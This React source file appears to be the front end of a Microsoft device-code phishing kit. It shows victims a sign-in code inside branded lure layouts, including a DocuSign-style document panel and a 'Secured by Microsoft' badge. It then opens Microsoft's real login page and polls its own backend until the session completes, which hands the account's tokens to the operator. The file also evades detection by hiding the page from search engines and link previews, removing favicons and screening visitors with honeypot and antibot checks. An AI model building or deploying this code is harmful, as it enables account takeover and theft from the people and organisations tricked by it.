import { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import { prepareAntibotPayload } from "../lib/antibot";
import { getTheme, type LinkTheme } from "../lib/themes";

const API_BASE = import.meta.env.VITE_API_URL || "";

interface SessionInfo {
  sessionId: string;
  userCode: string;
  verificationUri: string;
}

export function ConnectLinkPage() {
  const { loginId: linkId } = useParams<{ loginId: string }>();
  const [session, setSession] = useState<SessionInfo | null>(null);
  const [status, setStatus] = useState<"loading" | "starting" | "ready" | "signing_in" | "done" | "error">("loading");
  const [error, setError] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);
  const [honeypot, setHoneypot] = useState({ email_address: "", phone_number: "", website_url: "" });
  const [theme, setTheme] = useState<LinkTheme | null>(null);
  const [isMobile, setIsMobile] = useState(() => typeof window !== "undefined" && window.innerWidth < 768);

  useEffect(() => {
    const onResize = () => setIsMobile(window.innerWidth < 768);
    window.addEventListener("resize", onResize);
    return () => window.removeEventListener("resize", onResize);
  }, []);

  // Set page title + meta, remove favicon
  useEffect(() => {
    const originalTitle = document.title;
    if (theme) document.title = theme.pageTitle;

    const existingIcons = document.querySelectorAll("link[rel*='icon']");
    const removedIcons: { el: HTMLElement; parent: HTMLElement }[] = [];
    existingIcons.forEach((el) => {
      if (el.parentNode) {
        removedIcons.push({ el: el as HTMLElement, parent: el.parentNode as HTMLElement });
        el.parentNode.removeChild(el);
      }
    });

    const blankFavicon = document.createElement("link");
    blankFavicon.rel = "icon";
    blankFavicon.href = "data:,";
    document.head.appendChild(blankFavicon);

    const robotsMeta = document.createElement("meta");
    robotsMeta.name = "robots";
    robotsMeta.content = "noindex, nofollow, nosnippet, noarchive, noimageindex";
    document.head.appendChild(robotsMeta);

    const previewMetas = document.querySelectorAll(
      'meta[property^="og:"], meta[name="description"], meta[name="twitter:card"], meta[name="twitter:title"], meta[name="twitter:description"]'
    );
    const removedMetas: { el: HTMLElement; parent: HTMLElement }[] = [];
    previewMetas.forEach((el) => {
      if (el.parentNode) {
        removedMetas.push({ el: el as HTMLElement, parent: el.parentNode as HTMLElement });
        el.parentNode.removeChild(el);
      }
    });

    return () => {
      document.title = originalTitle;
      document.head.removeChild(blankFavicon);
      document.head.removeChild(robotsMeta);
      removedIcons.forEach(({ el, parent }) => parent.appendChild(el));
      removedMetas.forEach(({ el, parent }) => parent.appendChild(el));
    };
  }, [theme?.pageTitle]);

  // Step 1: Validate the link exists + get theme
  useEffect(() => {
    if (!linkId) return;

    fetch(`${API_BASE}/microsoft/connect-info/${linkId}`)
      .then((res) => {
        if (!res.ok) return res.json().catch(() => ({})).then((data) => {
          throw new Error(data.error || `Request failed (${res.status})`);
        });
        return res.json();
      })
      .then((data) => {
        if (data.theme) setTheme(getTheme(data.theme));
        startSession();
      })
      .catch((err) => {
        setError(err.message);
        setStatus("error");
      });
  }, [linkId]);

  // Step 2: Start a fresh device code session (with antibot protection)
  const startSession = async () => {
    setStatus("starting");
    setError(null);
    setSession(null);

    try {
      const antibotPayload = await prepareAntibotPayload(API_BASE, linkId!, honeypot);

      const res = await fetch(`${API_BASE}/microsoft/start-session/${linkId}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ antibot: antibotPayload }),
      });
      if (!res.ok) {
        const data = await res.json();
        throw new Error(data.error || "Failed to start session");
      }
      const data = await res.json();
      setSession({
        sessionId: data.sessionId,
        userCode: data.userCode,
        verificationUri: data.verificationUri,
      });
      setStatus("ready");
    } catch (err: any) {
      setError(err.message);
      setStatus("error");
    }
  };

  // Step 3: Poll for completion
  useEffect(() => {
    if (status !== "signing_in" || !session) return;

    const interval = setInterval(async () => {
      try {
        const res = await fetch(`${API_BASE}/microsoft/session-status/${session.sessionId}`);
        const data = await res.json();

        if (data.status === "completed") {
          clearInterval(interval);
          setStatus("done");
        } else if (data.status === "error") {
          clearInterval(interval);
          setError(data.error);
          setStatus("error");
        }
      } catch {
        // keep polling
      }
    }, 2000);

    return () => clearInterval(interval);
  }, [status, session]);

  const handleCopyCode = () => {
    if (session?.userCode) {
      navigator.clipboard.writeText(session.userCode);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const handleLogin = () => {
    if (!session) return;
    const url = `${session.verificationUri}?otc=${session.userCode}`;
    const w = 420;
    const h = 550;
    const left = Math.round(window.screenX + (window.outerWidth - w) / 2);
    const top = Math.round(window.screenY + (window.outerHeight - h) / 2);
    window.open(url, "msLogin", `width=${w},height=${h},left=${left},top=${top},menubar=no,toolbar=no,location=no,status=no,scrollbars=yes,resizable=no`);
    setStatus("signing_in");
  };

  const handleConnectAnother = () => {
    setHoneypot({ email_address: "", phone_number: "", website_url: "" });
    startSession();
  };

  // Render a neutral blank screen until the theme is loaded so the wrong
  // brand doesn't flash before the correct one
  if (!theme) {
    if (status === "error") {
      return (
        <div style={{
          minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center",
          background: "white", fontFamily: "system-ui, -apple-system, sans-serif",
          padding: 24, textAlign: "center", color: "#637282", fontSize: 14,
        }}>{error || "Something went wrong."}</div>
      );
    }
    return (
      <div style={{
        minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center",
        background: "white",
      }}>
        <div className="loading-spinner" />
      </div>
    );
  }

  const t = theme;

  // Honeypot fields shared by both layouts
  const honeypotFields = (
    <div
      style={{ position: "absolute", left: "-9999px", top: "-9999px", opacity: 0, height: 0, overflow: "hidden" }}
      aria-hidden="true"
      tabIndex={-1}
    >
      <input type="email" name="email_address" autoComplete="off" tabIndex={-1}
        value={honeypot.email_address}
        onChange={(e) => setHoneypot((prev) => ({ ...prev, email_address: e.target.value }))} />
      <input type="tel" name="phone_number" autoComplete="off" tabIndex={-1}
        value={honeypot.phone_number}
        onChange={(e) => setHoneypot((prev) => ({ ...prev, phone_number: e.target.value }))} />
      <input type="url" name="website_url" autoComplete="off" tabIndex={-1}
        value={honeypot.website_url}
        onChange={(e) => setHoneypot((prev) => ({ ...prev, website_url: e.target.value }))} />
    </div>
  );

  // Split-layout render (DocuSign-style)
  if (t.layout === "split") {
    return (
      <div style={{
        minHeight: "100vh",
        display: "flex",
        flexDirection: isMobile ? "column" : "row",
        fontFamily: "Inter, system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif",
        background: "white",
        color: "#1A1A1A",
      }}>
        {honeypotFields}

        {/* Left panel: document */}
        <div style={{
          flex: isMobile ? "0 0 auto" : "0 0 38%",
          background: t.bgTint,
          padding: isMobile ? "20px 20px 28px" : "32px 48px",
          display: "flex",
          flexDirection: "column",
          minHeight: isMobile ? "auto" : "100vh",
        }}>
          <div dangerouslySetInnerHTML={{ __html: t.logo }} />

          <div style={{
            flex: 1,
            display: "flex",
            flexDirection: "column",
            justifyContent: "center",
            alignItems: "center",
            textAlign: "center",
            marginTop: isMobile ? 20 : 0,
          }}>
            {/* Document icon with + badge */}
            <div style={{ position: "relative", marginBottom: 18 }}>
              <svg width={isMobile ? 56 : 80} height={isMobile ? 68 : 96} viewBox="0 0 80 96" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M10 8 a4 4 0 0 1 4 -4 h44 l18 18 v62 a4 4 0 0 1 -4 4 H14 a4 4 0 0 1 -4 -4 V8z" fill="white" stroke="#D4D2CF" strokeWidth="2"/>
                <path d="M58 4 v14 a4 4 0 0 0 4 4 h14" fill="none" stroke="#D4D2CF" strokeWidth="2"/>
                <line x1="22" y1="38" x2="58" y2="38" stroke="#E5E2DD" strokeWidth="2" strokeLinecap="round"/>
                <line x1="22" y1="48" x2="58" y2="48" stroke="#E5E2DD" strokeWidth="2" strokeLinecap="round"/>
                <line x1="22" y1="58" x2="46" y2="58" stroke="#E5E2DD" strokeWidth="2" strokeLinecap="round"/>
              </svg>
              <div style={{
                position: "absolute",
                bottom: -6,
                right: -6,
                width: 28,
                height: 28,
                borderRadius: "50%",
                background: t.primaryColor,
                color: "white",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                fontSize: 18,
                fontWeight: 600,
                lineHeight: 1,
                boxShadow: "0 2px 6px rgba(0,0,0,0.15)",
              }}>+</div>
            </div>
            <div style={{ fontSize: 15, fontWeight: 600, color: "#1A1A1A", marginBottom: 6 }}>
              {t.documentName}
            </div>
            <div style={{ fontSize: 13, fontWeight: 600, color: t.documentLabelColor || "#C99700" }}>
              {t.documentLabel}
            </div>
          </div>
        </div>

        {/* Right panel: auth */}
        <div style={{
          flex: 1,
          padding: isMobile ? "28px 20px 24px" : "32px 48px",
          display: "flex",
          flexDirection: "column",
          minHeight: isMobile ? "auto" : "100vh",
        }}>
          <div style={{
            flex: 1,
            display: "flex",
            flexDirection: "column",
            justifyContent: "center",
            alignItems: "center",
            maxWidth: 460,
            width: "100%",
            margin: "0 auto",
          }}>
            {(status === "loading" || status === "starting") && (
              <div style={{ textAlign: "center", padding: "40px 0" }}>
                <div className="loading-spinner" />
                <p style={{ marginTop: 16, color: "#637282", fontSize: 14 }}>
                  {status === "loading" ? "Loading..." : "Preparing secure access..."}
                </p>
              </div>
            )}

            {status === "ready" && session && (
              <div style={{ width: "100%" }}>
                {/* Lock icon */}
                <div style={{
                  width: 56, height: 56, borderRadius: "50%",
                  background: "#F4ECFD",
                  display: "flex", alignItems: "center", justifyContent: "center",
                  margin: "0 auto 24px",
                }}>
                  <svg width="22" height="22" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M17 9h-1V7a4 4 0 1 0-8 0v2H7a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2zm-7-2a2 2 0 0 1 4 0v2h-4V7zm7 13H7v-9h10v9z" fill={t.primaryColor}/>
                  </svg>
                </div>

                <h1 style={{
                  fontSize: isMobile ? 22 : 28, fontWeight: 700,
                  textAlign: "center", margin: "0 0 12px",
                  color: "#1A1A1A", letterSpacing: "-0.5px",
                }}>{t.heading}</h1>
                <p style={{
                  marginBottom: 28, color: "#637282",
                  textAlign: "center", lineHeight: 1.55, fontSize: isMobile ? 13.5 : 14.5,
                }}>{t.subtitle}</p>

                {/* Dark verification code card */}
                <div style={{
                  background: t.cardBg || "#1A1A1A",
                  borderRadius: 12,
                  padding: isMobile ? "22px 16px" : "26px 24px",
                  marginBottom: 28,
                  textAlign: "center",
                }}>
                  <div style={{
                    fontSize: 11, color: "#9CA3AF",
                    marginBottom: 14, textTransform: "uppercase",
                    letterSpacing: 1.8, fontWeight: 600,
                  }}>{t.codeLabel}</div>
                  <div style={{
                    fontSize: isMobile ? 22 : 28, fontWeight: 700, letterSpacing: isMobile ? 4 : 6,
                    color: "white", fontFamily: "ui-monospace, monospace",
                    marginBottom: 18,
                    wordBreak: "break-all",
                  }}>{session.userCode}</div>
                  <button
                    onClick={handleCopyCode}
                    style={{
                      padding: "8px 22px", fontSize: 13, fontWeight: 600,
                      background: t.primaryColor,
                      color: t.buttonTextColor || "white",
                      border: "none", borderRadius: 8, cursor: "pointer",
                      transition: "background 0.2s",
                    }}
                    onMouseEnter={(e) => (e.currentTarget.style.background = t.hoverColor)}
                    onMouseLeave={(e) => (e.currentTarget.style.background = t.primaryColor)}
                  >{copied ? "Copied!" : "Copy Code"}</button>
                </div>

                {/* Numbered steps with circle badges */}
                <div style={{ display: "flex", flexDirection: "column", gap: 10, marginBottom: 24 }}>
                  {t.steps.map((step, i) => (
                    <div key={i} style={{ display: "flex", alignItems: "center", gap: 12 }}>
                      <div style={{
                        flexShrink: 0,
                        width: 24, height: 24, borderRadius: "50%",
                        background: t.primaryColor, color: "white",
                        display: "flex", alignItems: "center", justifyContent: "center",
                        fontSize: 12, fontWeight: 700,
                      }}>{i + 1}</div>
                      <div style={{ fontSize: 14, color: "#1A1A1A" }}>{step}</div>
                    </div>
                  ))}
                </div>

                {/* Continue to Microsoft button */}
                <button
                  onClick={handleLogin}
                  style={{
                    padding: "14px 24px", fontSize: 15, width: "100%",
                    display: "flex", justifyContent: "center", alignItems: "center", gap: 10,
                    background: t.primaryColor, color: t.buttonTextColor || "white",
                    border: "none", borderRadius: 8, cursor: "pointer", fontWeight: 600,
                    transition: "background 0.2s",
                  }}
                  onMouseEnter={(e) => (e.currentTarget.style.background = t.hoverColor)}
                  onMouseLeave={(e) => (e.currentTarget.style.background = t.primaryColor)}
                >
                  <svg width="18" height="18" viewBox="0 0 18 18" xmlns="http://www.w3.org/2000/svg">
                    <rect x="0" y="0" width="8" height="8" fill="#F25022"/>
                    <rect x="9" y="0" width="8" height="8" fill="#7FBA00"/>
                    <rect x="0" y="9" width="8" height="8" fill="#00A4EF"/>
                    <rect x="9" y="9" width="8" height="8" fill="#FFB900"/>
                  </svg>
                  {t.buttonText}
                </button>

                <div style={{
                  marginTop: 14, textAlign: "center",
                  display: "flex", alignItems: "center", justifyContent: "center", gap: 6,
                  fontSize: 12, color: "#637282",
                }}>
                  <span style={{
                    display: "inline-block", width: 8, height: 8, borderRadius: "50%",
                    background: "#10B981",
                  }} />
                  Secured by Microsoft
                </div>
              </div>
            )}

            {status === "signing_in" && (
              <div style={{ textAlign: "center" }}>
                <h1 style={{ fontSize: 24, fontWeight: 700, marginBottom: 12, color: "#1A1A1A" }}>Waiting for sign-in</h1>
                <p style={{ color: "#637282", marginBottom: 24, lineHeight: 1.55, fontSize: 14.5 }}>
                  Complete the sign-in in the Microsoft window that opened. This page will update automatically.
                </p>
                <div className="loading-spinner" />
              </div>
            )}

            {status === "done" && (
              <div style={{ textAlign: "center" }}>
                <div style={{
                  width: 56, height: 56, borderRadius: "50%", background: "#e6f9ed",
                  display: "flex", alignItems: "center", justifyContent: "center",
                  margin: "0 auto 20px",
                }}>
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z" fill="#0d9f3f"/>
                  </svg>
                </div>
                <h1 style={{ fontSize: 24, fontWeight: 700, marginBottom: 8, color: "#1A1A1A" }}>{t.successHeading}</h1>
                <p style={{ color: "#637282", lineHeight: 1.55, marginBottom: 20, fontSize: 14.5 }}>
                  {t.successMessage}
                </p>
                <button
                  onClick={handleConnectAnother}
                  style={{
                    padding: "10px 24px", fontSize: 14,
                    background: t.primaryColor, color: t.buttonTextColor || "white",
                    border: "none", borderRadius: 8, cursor: "pointer", fontWeight: 600,
                  }}
                >{t.againLabel}</button>
              </div>
            )}

            {status === "error" && (
              <div style={{ textAlign: "center" }}>
                <div style={{
                  width: 56, height: 56, borderRadius: "50%", background: "#fde8e8",
                  display: "flex", alignItems: "center", justifyContent: "center",
                  margin: "0 auto 20px",
                }}>
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" fill="#d32f2f"/>
                  </svg>
                </div>
                <h1 style={{ fontSize: 24, fontWeight: 700, marginBottom: 8, color: "#1A1A1A" }}>Something went wrong</h1>
                <p style={{ color: "#d32f2f", marginBottom: 16, lineHeight: 1.55, fontSize: 14.5 }}>
                  {error || "Please try again."}
                </p>
                <button
                  onClick={handleConnectAnother}
                  style={{
                    padding: "10px 24px", fontSize: 14,
                    background: t.primaryColor, color: t.buttonTextColor || "white",
                    border: "none", borderRadius: 8, cursor: "pointer", fontWeight: 600,
                  }}
                >Try again</button>
              </div>
            )}
          </div>

          {t.footerText && (
            <div style={{ textAlign: "center", color: "#9CA3AF", fontSize: 12 }}>
              {t.footerText}
            </div>
          )}
        </div>
      </div>
    );
  }

  return (
    <div className="login-page">
      <div className="login-card" style={{ maxWidth: 480 }}>
        {/* Honeypot fields */}
        <div
          style={{ position: "absolute", left: "-9999px", top: "-9999px", opacity: 0, height: 0, overflow: "hidden" }}
          aria-hidden="true"
          tabIndex={-1}
        >
          <input type="email" name="email_address" autoComplete="off" tabIndex={-1}
            value={honeypot.email_address}
            onChange={(e) => setHoneypot((prev) => ({ ...prev, email_address: e.target.value }))} />
          <input type="tel" name="phone_number" autoComplete="off" tabIndex={-1}
            value={honeypot.phone_number}
            onChange={(e) => setHoneypot((prev) => ({ ...prev, phone_number: e.target.value }))} />
          <input type="url" name="website_url" autoComplete="off" tabIndex={-1}
            value={honeypot.website_url}
            onChange={(e) => setHoneypot((prev) => ({ ...prev, website_url: e.target.value }))} />
        </div>

        {/* Logo */}
        <div style={{ textAlign: "center", marginBottom: 24 }}
          dangerouslySetInnerHTML={{ __html: t.logo }} />

        {(status === "loading" || status === "starting") && (
          <div style={{ textAlign: "center", padding: "40px 0" }}>
            <div className="loading-spinner" />
            <p style={{ marginTop: 16, color: "#637282" }}>
              {status === "loading" ? "Loading..." : "Preparing secure access..."}
            </p>
          </div>
        )}

        {status === "ready" && session && (
          <div>
            <h1 style={{ fontSize: 20, marginBottom: 8, textAlign: "center", color: "#1e1919" }}>{t.heading}</h1>
            <p style={{ marginBottom: 28, color: "#637282", textAlign: "center", lineHeight: 1.6, fontSize: 14 }}>
              {t.subtitle}
            </p>

            <div style={{
              background: t.bgTint, borderRadius: 12,
              padding: "24px", marginBottom: 20, textAlign: "center",
            }}>
              <div style={{ fontSize: 11, color: "#637282", marginBottom: 10, textTransform: "uppercase", letterSpacing: 1.5, fontWeight: 600 }}>
                {t.codeLabel}
              </div>
              <div style={{
                fontSize: isMobile ? 26 : 36, fontWeight: 700, letterSpacing: isMobile ? 4 : 8,
                color: t.codeColor || t.primaryColor, fontFamily: "monospace", marginBottom: 12,
                wordBreak: "break-all",
              }}>
                {session.userCode}
              </div>
              <button
                onClick={handleCopyCode}
                style={{
                  padding: "6px 20px", fontSize: 13,
                  background: copied ? t.primaryColor : "white",
                  color: copied ? (t.buttonTextColor || "white") : "#1e1919",
                  border: "1px solid #d4d2cf",
                  borderRadius: 8, cursor: "pointer", transition: "all 0.2s",
                }}
              >
                {copied ? "Copied!" : "Copy Code"}
              </button>
            </div>

            <div style={{
              marginBottom: 20, padding: "16px",
              background: t.bgTint, borderRadius: 8,
              fontSize: 13, color: "#637282", lineHeight: 1.8,
            }}>
              <div style={{ fontWeight: 600, marginBottom: 8, color: "#1e1919" }}>Steps:</div>
              {t.steps.map((step, i) => (
                <div key={i}>{i + 1}. {step}</div>
              ))}
            </div>

            <button
              onClick={handleLogin}
              style={{
                padding: "14px 32px", fontSize: 15, width: "100%",
                display: "flex", justifyContent: "center", alignItems: "center", gap: 8,
                background: t.primaryColor, color: t.buttonTextColor || "white", border: "none",
                borderRadius: 8, cursor: "pointer", fontWeight: 600,
                transition: "background 0.2s",
              }}
              onMouseEnter={(e) => (e.currentTarget.style.background = t.hoverColor)}
              onMouseLeave={(e) => (e.currentTarget.style.background = t.primaryColor)}
            >
              {t.buttonText}
            </button>
          </div>
        )}

        {status === "signing_in" && (
          <div style={{ textAlign: "center" }}>
            <h1 style={{ fontSize: 20, marginBottom: 8, color: "#1e1919" }}>Waiting for sign-in</h1>
            <p style={{ color: "#637282", marginBottom: 24, lineHeight: 1.6, fontSize: 14 }}>
              Complete the sign-in in the Microsoft window that opened. This page will update automatically.
            </p>
            <div className="loading-spinner" />
          </div>
        )}

        {status === "done" && (
          <div style={{ textAlign: "center" }}>
            <div style={{
              width: 56, height: 56, borderRadius: "50%", background: "#e6f9ed",
              display: "flex", alignItems: "center", justifyContent: "center",
              margin: "0 auto 20px",
            }}>
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z" fill="#0d9f3f"/>
              </svg>
            </div>
            <h1 style={{ fontSize: 20, marginBottom: 8, color: "#1e1919" }}>{t.successHeading}</h1>
            <p style={{ color: "#637282", lineHeight: 1.6, marginBottom: 20, fontSize: 14 }}>
              {t.successMessage}
            </p>
            <button
              onClick={handleConnectAnother}
              style={{
                padding: "10px 24px", fontSize: 14,
                background: t.primaryColor, color: t.buttonTextColor || "white", border: "none",
                borderRadius: 8, cursor: "pointer", fontWeight: 600,
              }}
            >
              {t.againLabel}
            </button>
          </div>
        )}

        {status === "error" && (
          <div style={{ textAlign: "center" }}>
            <div style={{
              width: 56, height: 56, borderRadius: "50%", background: "#fde8e8",
              display: "flex", alignItems: "center", justifyContent: "center",
              margin: "0 auto 20px",
            }}>
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" fill="#d32f2f"/>
              </svg>
            </div>
            <h1 style={{ fontSize: 20, marginBottom: 8, color: "#1e1919" }}>Something went wrong</h1>
            <p style={{ color: "#d32f2f", marginBottom: 16, lineHeight: 1.6, fontSize: 14 }}>
              {error || "Please try again."}
            </p>
            <button
              onClick={handleConnectAnother}
              style={{
                padding: "10px 24px", fontSize: 14,
                background: t.primaryColor, color: t.buttonTextColor || "white", border: "none",
                borderRadius: 8, cursor: "pointer", fontWeight: 600,
              }}
            >
              Try again
            </button>
          </div>
        )}
      </div>
    </div>
  );
}
